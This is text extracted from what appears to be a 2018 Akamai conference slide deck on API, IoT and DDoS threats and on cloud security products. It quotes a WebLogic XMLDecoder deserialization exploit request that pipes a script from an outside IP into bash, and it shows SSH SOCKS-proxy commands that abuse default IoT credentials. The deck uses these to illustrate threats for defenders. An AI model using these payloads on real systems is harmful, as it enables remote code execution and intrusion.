DISAPPEARING PERIMETERS
Combating Security challenges with cloud security
Aseem Ahmed
Sr. Product Manager - Cloud Security, Akamai Technologies

Evolution of web

Elastic, rich and vulnerable..

Before the Internet

People

Things

Content

Services

2016  DDoS > 600 Gbps. Introduction of Merai
2018  Largest DDoS > 1.3 Tbps

1986  NSFnet + ARPANET 2007  Largest DDoS >50 Gbps

MySpace / LinkedIn hacks

Imagine the next attack
"The true sign of intelligence is not knowledge but imagination." - Albert Einstein

Rich and vulnerable with APIs..
Travel and Transportation

API Server

Cloud / Internet

Retail

Banking

Media and Entertainment

IT/ITES Healthcare Automotive e wallets

Manufacturing

Governments

API Attacks overview
API Attacks

Web Attacks (XSS, SQLi)

Application Logic & Parser Targeted Attacks

DDoS Attacks

The key difference between a normal web request and API request is that APIs use JSON or XML that are significantly more complicated than simple parameters. This creates a new attack surface.

API Attacks : Common vulnerabilities target
CSI Data 2017

JWT Decoded: Authorization attacks
Q:Is it ok to store user credentials (username / password) in the JWT? A: No, it is not secure to send a password in a JWT. This is because the JWT claims are simply encoded and can easily be decoded by anyone that sees them. This problem can be solved by digitally signing JWT with a secret or PKI.

Deserialization Problems: RCE Attacks

The code on the right is an example of RCE attack. Let's assume that the input the server is expecting to be as follows:

<products> <product>
</product> <product>
</product> </products>

<id>Car</id> <id>Motorbike</id>

API Positive Security guards against attacks such as these by blocking all the requests that are not in pre-defined format.

OWASP Top 10: #8 Insecure Deserialization

POST /wls-wsat/CoordinatorPortType HTTP/1.1 Host: 162.136.xxx.xxx User-Agent: python-requests/2.18.4 Accept-Encoding: gzip, deflate Accept: */* Connection: keep-alive Content-Type: text/xml Content-Length: 837 <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
<soapenv:Header> <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"> <java version="1.8.0_131" class="java.beans.XMLDecoder"> <void class="java.lang.ProcessBuilder"> <array class="java.lang.String" length="3"> <void index="0"> <string>/bin/sh</string> </void> <void index="1"> <string>-c</string> </void> <void index="2"> <string>/usr/bin/curl -s http://35.194.156.203/ftw.sh | /bin/bash -s</string> </void> </array> <void method="start"/> </void> </java> </work:WorkContext>
</soapenv:Header> <soapenv:Body/> </soapenv:Envelope>

Logical DoS Attacks

Hash Collision attacks
Specially crafted request that causes multiple hash collision can cause DoS attack on server.

Deep nested structure
Specially crafted request with deep nesting as shown below can exhaust server memory very quickly.

Eg:

Eg: {"p":{"p":{"p":{...................}}}}

{"4vq":"key1", "4wP2":"key2", "5Uq":"key3",

"5VP":"key4", "64q":"key5" }

The large payload of the above pattern when

sent to a vulnerable deserializer can slowdown

The large payload of the above pattern when a server.

sent to a vulnerable json_decode function

in a server can slow down the server.

The problems mentioned above can be mitigated by setting maximum allowed parameters and setting maximum nesting depth.

Enhancing API Security

API Calls

API Management Gateway

Positive Security
Check for allowed Methods

- Validate JWT tokens
- Manage request numbers
- Handle caching

Validate Input Structure Validate Parameters Validate headers

Provides management Platform for APIs

Protects against deserialization attacks and logical DDoS attacks.

WAF and DDoS Security
Apply Negative Security
Protects against Web attacks such as SQLi, XSS,DDoS

API Server

Elastic and vulnerable with IoTs

API

Bluetooth

Ant+ Ant+

Bicycle Sensor Heart Rate Sensor

Ant+

Controller Application

Database

Management Portal

APIPatches

Desktop

Ant+ or USB

Cable

Reporting via API

Downloads

Shoe Sensor
Detection Devices X-ray machines, Explosives Detectors

Patch Server

Device Administrator Sets Password Reviews Equipment Alerts

Wifi API Thermostat

HVAC

SSH as SOCKS Proxy: Exploitation of IoT devices
/> ssh ­D 8080 ­N cctv_admin@iot.vuln (requires "default" account credentials) /> curl --proxy socks5h://localhost:8080 http://target.site/

Attacks are doubling in size every 2 years
1 MB response

Country
China United States France Hong Kong Russia Japan Germany Canada Vietnam UK Singapore Netherlands Turkey Indonesia Brazil Poland India Ukraine Romania Lithuania

Total
20,327 17,320
3,283 3,005 1,758 1,652 1,567 1,532 1,346 1,112 1,063 1,054 1,044
748 679 543 522 504 458 451

Memcached UDP reflection: 5000x AMPLIFICATION

©2018 AKAMAI | FASTER FORWARDTM

Are you still fighting with attackers the old way?
With traditional security technologies, malicious traffic still lands at your door step
Creating business risk

Traditional security perimeters are fading away

Cloud must become the new perimeter
By 2020, a Corporate "No-Cloud" Policy Will Be as Rare as a "No-Internet" Policy Is Today - Gartner

Cloud Delivery Platforms to build your Digital and Security strategy

Delivery platform extend the application infrastructure with global scalability & resiliency

Cloud perimeter adapts to your application infrastructure and stops attacks in the cloud

Integrated security solutions on a global distributed platform

Cloud Security ­ Key elements
§ Cloud provides fluid security controls with automatic scaling § API Management & Security ­ Micro Services & Container § Security analytics - Machine learning / AI opportunities § Agility ­ Merger of Security, DevOps and CI/CD § Security without compromising on performance

Akamai WeChat / Akamai
PLEASE ADD OUR WECHAT ACCOUNT FOR WEEKLY SECURITY CONTENT Akamai PLEASE VISIT OUR BOOTH AT B12 DEMOS WILL BE DELIVERED AkamaiB12

THANKS

